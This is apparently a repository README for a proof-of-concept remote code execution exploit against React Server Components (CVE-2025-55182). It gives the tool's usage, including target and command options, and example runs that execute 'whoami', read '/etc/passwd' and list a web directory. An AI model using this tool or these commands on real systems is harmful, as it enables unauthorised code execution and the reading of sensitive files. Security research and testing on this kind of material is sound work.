This repository contains a proof‑of‑concept demonstrating how a specific class of React Server Component vulnerabilities behaves inside a **controlled, legal training environment**.  

## Manual

```
┌──(kali㉿kali)-[~/Documents/tools/2025-55182]                                                                          
└─$ python exploit.py -h                                                                                                
                                                                                                         
                                                                                                         
      /\                                                                                                 
     /**\
    /****\
   /******\
  /********\
 /**********\
      ||     
                          
    [CVE-2025-55182 React Server Components RCE]            
                                                    
usage: exploit.py [-h] [-t URL] [-c CMD]                    
                                                    
options:                      
  -h, --help         show this help message and exit                                                                    
  -t, --target URL   Target URL or domain (default: http://hacx.me)
  -c, --command CMD  Command to execute on target (default: id)    
                                                                                                         
Examples:                     
  exploit.py -t hacx.me -c "whoami"                         
  exploit.py -t http://hacx.me -c "cat /etc/passwd"
  exploit.py -t hacx.me -c "ls -la /var/www"
```

## Video PoC

![poc2](https://github.com/user-attachments/assets/d1d86d72-39cb-4af8-9dca-611a0cad9ef7)






